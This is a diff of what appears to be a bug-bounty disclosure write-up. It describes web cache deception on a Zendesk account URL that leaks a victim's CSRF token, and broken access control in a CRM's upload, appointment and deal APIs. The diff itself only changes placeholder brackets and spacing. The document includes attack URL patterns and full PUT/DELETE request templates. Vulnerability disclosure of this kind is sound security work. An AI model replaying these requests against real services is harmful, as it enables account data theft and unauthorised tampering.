@@ -69,11 +69,11 @@ Cache deception attack  is often caused by a non-standard server-side setting ov
 The key component of the attack is "path confusion," which involves altering URL routes to trick the cache server into identifying private HTTP answers as publicly cacheable documents.
 
 
-For example In Zendesk the URL `https://developer.zendesk.com/account` refers to content containing sensitive data that should not be cached. The attacker tricks the target user into making a request to `https://developer.zendesk.com/account/<Anything>.css` causing the server to respond with response containing sensitive information specific to the victim.
+For example In Zendesk the URL `https://developer.zendesk.com/account` refers to content containing sensitive data that should not be cached. The attacker tricks the target user into making a request to `https://developer.zendesk.com/account/[Anything].css` causing the server to respond with response containing sensitive information specific to the victim.
  
- However, the proxy interprets the request to `https://developer.zendesk.com/account/<Anything>.css` as being a request for a non-existent-cacheable '<anything>.css' file, which in turn causes the sensitive content stored in the cache and accessible by others.
+ However, the proxy interprets the request to `https://developer.zendesk.com/account/[Anything].css` as being a request for a non-existent-cacheable '[anything].css' file, which in turn causes the sensitive content stored in the cache and accessible by others.
  
- Which means an Attacker can trick the victim to visit `https://developer.zendesk.com/account/<Anything>.css` and later visit the same url and to get the cached response of the page which contains name,email and CSRF token of the victim. later, The CSRF TOKEN can be used to perform appilication wide csrf attack.
+ Which means an Attacker can trick the victim to visit `https://developer.zendesk.com/account/[Anything].css` and later visit the same url and to get the cached response of the page which contains name,email and CSRF token of the victim. later, The CSRF TOKEN can be used to perform appilication wide csrf attack.
 
 
 __Here is a quick Video POC for the vulnerability:__
@@ -125,7 +125,7 @@ But we identified a vulnerable endpoint through which we were still able to gain
 - Editing documents on contacts
  
 ```http
-PUT /apis/uploader/api/v2/uploads/<upload_id>.json 
+PUT /apis/uploader/api/v2/uploads/[upload_id].json 
 ```
  
 So we were able to effect the integrity of the documents as we were able to edit the names of documents and even change their extensions.
@@ -156,19 +156,19 @@ x-csrf-token-generated-at: 1597815645
 Content-Type: application/json
 Accept: application/json, text/javascript, */*; q=0.01
 X-Requested-With: XMLHttpRequest
-x-csrf-token-signature: <VALUE>
+x-csrf-token-signature: [VALUE]
 Referer: https://app.futuresimple.com/crm/contacts/288149956
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
-Cookie:<VALUE>
+Cookie:[VALUE]
 
-{"appointment":{"contact_id":"<contact id>","start_at":"2020-08-17T00:00:00.000Z","end_at":"2020-08-17T23:59:59.999Z","is_public":false,"send_updates":true,"name":"New Appointment on Sunda","location":"New York","description":"","all_day":true}
+{"appointment":{"contact_id":"[contact-id]","start_at":"2020-08-17T00:00:00.000Z","end_at":"2020-08-17T23:59:59.999Z","is_public":false,"send_updates":true,"name":"New Appointment on Sunda","location":"New York","description":"","all_day":true}
 ```
 
 The limitted user was able to cancel/delete all of the appointments via below `http request` by changing the **appointment id**.
 
 ```http
-DELETE /apis/appointments/api/v1/appointments/<<apppointment id>>.json HTTP/1.1
+DELETE /apis/appointments/api/v1/appointments/[apppointment-id].json HTTP/1.1
 Host: app.futuresimple.com
 Connection: close
 Content-Length: 12
@@ -180,11 +180,11 @@ x-csrf-token-generated-at: 1597816624
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 Accept: application/json, text/javascript, */*; q=0.01
 X-Requested-With: XMLHttpRequest
-x-csrf-token-signature: <VALUE>
+x-csrf-token-signature: [VALUE]
 Referer: https://app.futuresimple.com/crm/contacts/288149956
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
-Cookie: <VALUE>
+Cookie: [VALUE]
 platform=web
 ```
 This could lead to *uanuthorized creation of appointments* in an organization and also could have impacted the *integrity and availability  of the contacts and appointments*.
@@ -212,11 +212,14 @@ The admin of the account creates a pipeline and keeps it personal to him without
 But we analysed  the following vulnerable request through which we were able to accomplish the task of adding our own deals to admin's pipeline .  
 
 - Moving deals into admins's sales pipeline
+ 
 ```http
-PUT /apis/sales/api/v1/deals/<deal-id>.json HTTP/1.1
+PUT /apis/sales/api/v1/deals/[deal-id].json HTTP/1.1
 
 {"pipeline_stage_id":}
 ```
+ 
+ 
 So, here due to broken access control on this endpoint we were able to gain an unauthorised access on admin's pipeline allowing us to move our deals into admin's pipeline.
 
 
